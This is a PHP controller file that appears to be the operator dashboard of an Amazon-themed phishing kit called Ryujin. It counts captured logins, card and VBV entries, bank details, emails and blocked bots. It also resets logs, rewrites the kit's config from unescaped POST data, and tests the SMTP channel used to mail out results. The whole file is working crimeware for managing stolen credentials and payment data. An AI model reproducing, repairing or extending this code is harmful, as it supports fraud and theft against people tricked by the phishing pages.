<?php defined('ROOT_PATH') or die('Direct access not allowed ');
/**
 *  Shin-RyuJin
 * 
 * @author Han Ji Pyeong
 * @version 1.0 2020
 * @since 2018
 * @copyright 7Inc Store 
 * 
 */

Class RyupanelController extends RyuController{

public function __construct()
{
    parent::__construct();
    $this->helper('number');
    $this->helper('session');
}
public function indexAction(){

            if(!session_has('logged_in'))
            {
                return $this->redirect('?c=ryupanel&a=signin');
                exit;
            }
            $data['count_visitor'] = count_stats('visitor');
            $data['count_login'] = count_stats('login');
            $data['count_card'] = count_stats('card');
            $data['count_vbv'] = count_stats('card-vbv');
            $data['count_bot'] = count_stats('block');
            $data['count_email'] = count_stats('email');
            $data['count_pap'] = count_stats('pap');
            $data['count_bank'] = count_stats('bank');
            $this->view('ryupanel/index',$data);

        }
public function validateAction()
{
    $TOKEN = CONFIG['ryujin']['token'];

    if(isset($_POST))
    {
        if($this->handler->post('token') == $TOKEN)
        {
            session_set('logged_in',true);
            return $this->redirect('?c=ryupanel');
        }else{
            return $this->redirect('?c=ryupanel&a=signin');
        }
    }
}
public function resetAction(){

          $logs = PUBLIC_PATH.'logs/';
          foreach(scandir($logs) as $l)
          {
              if(!preg_match("/log/",$l))continue;
              @unlink($logs.$l);
          }
          return $this->redirect('?c=ryupanel');

        }
     
public function visitAction()
{
    
    $link = $this->handler->getDomain();
    return $this->redirect('//'.$link.'/?'.CONFIG['app']['parameter']);
}

public function configAction(){

if(isset($_POST))
{
    $cfg = ";;; RYUJIN AMAZON \n";
    $cfg.= ";;; UPDATED CONFIG DATE : ".date('D, Y-m-d H:i')."\n\n";
    foreach($_POST as $key=>$val)
    { if($key == 'submit')continue;
        $cfg.= $key." = \"".$val."\" \n";
       
    }

    $cfgfile = CONFIG_PATH.'/ryujin-config.ini';
    $fp = fopen($cfgfile,'w');
    fwrite($fp,$cfg);
    fclose($fp);
    
    return $this->redirect('?c=ryupanel');
}

        }
public function smtptestAction()
{
      $this->handler->smtp_settings = ['hostname' => CONFIG['app']['smtp_hostname'],
                                        'port' => CONFIG['app']['smtp_port'],
                                        'username' => CONFIG['app']['smtp_username'],
                                        'password' => CONFIG['app']['smtp_password'],
                                        'secure' => CONFIG['app']['smtp_secure']
                                        ];
    $from = ['from_name' => 'RYUJIN SMTP TEST', 'from_mail' => 'test@ryujinframework.net' ];
    $to = CONFIG['app']['email_result'];
    $subject = 'JUST A TEST SMTP - RYUJIN';
    $msg = '<center><br><br><h1><b>It\'s WORK !</b></h1></center>';
    $this->handler->sendemail($from,$to,$subject,$msg);
    echo "<script>alert('done');window.location.href='?c=ryupanel';</script>";
}
public function logoutAction(){

        session_destroy();
        return $this->redirect('?c=ryupanel&a=signin');

        }

public function signinAction(){

            $this->view('ryupanel/signin');

        }

}

?>